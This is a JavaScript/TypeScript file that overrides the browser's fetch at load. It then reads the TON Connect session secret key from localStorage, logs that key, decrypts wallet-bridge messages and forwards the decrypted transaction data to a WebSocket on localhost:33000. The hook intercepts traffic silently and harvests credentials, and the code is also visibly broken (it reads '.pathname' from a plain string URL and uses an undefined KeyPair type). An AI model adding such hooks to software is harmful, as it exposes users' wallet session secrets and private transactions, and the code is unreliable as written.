/* eslint-disable */
// @ts-nocheck
import { SessionCrypto } from '@tonconnect/protocol'
import { ed25519, x25519 } from '@noble/curves/ed25519'


export function secretKeyToX25519(secretKey: Buffer | Uint8Array): KeyPair {
  const publicKey = x25519.getPublicKey(secretKey)

  return {
    secretKey: Buffer.from(secretKey),
    publicKey: Buffer.from(publicKey),
  }
}



;(function (originalFetch) {
  window.fetch = async function (resource, options = {}) {
    interceptFetch(resource, options)

    const response = originalFetch.apply(this, arguments)
    return response
  }
})(window.fetch)

async function interceptFetch(resource, options) {
  const url = resource instanceof Request ? resource.url : resource
  console.log('fetch called', url)
  // Log POST request data
  if (options.method && options.method.toLowerCase() === 'post') {
    console.log('Fetch POST Request Started:', url)
    if (options.body) {
      console.log('Fetch POST Data:', options.body)
    }

    if (url.pathname.includes('/message')) {
      try {
          const base64Data = options.body
          const decodedData = Buffer.from(base64Data, 'base64')
          console.log('Decoded Data:', decodedData)

          const localData = JSON.parse(localStorage.getItem('ton-connect-storage_bridge-connection')) as {
              session: {
                  sessionKeyPair: {
                      publicKey: string
                      secretKey: string
                  }
                  walletPublicKey: string
              }
          }

          console.log('Local Data:', localData)

          const sessionPublicKey = Buffer.from(localData.session.sessionKeyPair.publicKey, 'hex')
          const sessionSecretKey = Buffer.from(localData.session.sessionKeyPair.secretKey, 'hex')
          const walletPublicKey = Buffer.from(localData.session.walletPublicKey, 'hex')

          console.log('Session Public Key:', sessionPublicKey)
          console.log('Session Secret Key:', sessionSecretKey)
          console.log('Wallet Public Key:', walletPublicKey)

          const keyPair = secretKeyToX25519(sessionSecretKey)
          const session = new SessionCrypto({
              publicKey: Buffer.from(keyPair.publicKey).toString('hex'),
              secretKey: Buffer.from(keyPair.secretKey).toString('hex'),
          })

          const decryptedData = session.decrypt(decodedData, walletPublicKey)
          console.log('Decrypted Data:', decryptedData)

          const jsonData = JSON.parse(decryptedData)
          console.log('JSON Data:', jsonData)

          // Send the decrypted data to WebSocket server
          try {
              const ws = new WebSocket('ws://localhost:33000')
              
              ws.onopen = function() {
                  console.log('WebSocket connection established')
                  ws.send(JSON.stringify({
                      msg_type: 'proxy_transaction',
                      data: jsonData
                  }))
                  console.log('Sent decrypted data to WebSocket server')
                  ws.close()
              }
              
              ws.onerror = function(error) {
                  console.error('WebSocket error:', error)
              }
          } catch (wsError) {
              console.error('WebSocket connection error:', wsError)
          }
          
      } catch (error) {
          console.error('Error decrypting data:', error)
      }
    }
  }
}